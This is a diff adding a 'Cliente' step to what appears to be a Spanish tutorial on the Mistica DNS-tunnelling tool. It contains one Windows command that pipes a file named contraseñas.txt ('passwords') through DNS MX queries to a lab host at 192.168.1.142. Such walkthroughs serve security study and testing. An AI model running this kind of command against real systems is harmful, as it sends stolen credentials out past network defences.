@@ -248,3 +248,11 @@ Servidor:
 
 
 ![image115.png]({{site.baseurl}}/images/Mistica/image115.png)
+
+Cliente
+
+Desde CMD:
+`python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m io:dns -w "--hostname 192.168.1.142 --port 53 --query MX" -k key < C:\Users\Sergio\Downloads\Mistica-master\contraseñas.txt`
+
+
+![image116.png]({{site.baseurl}}/images/Mistica/image116.png)
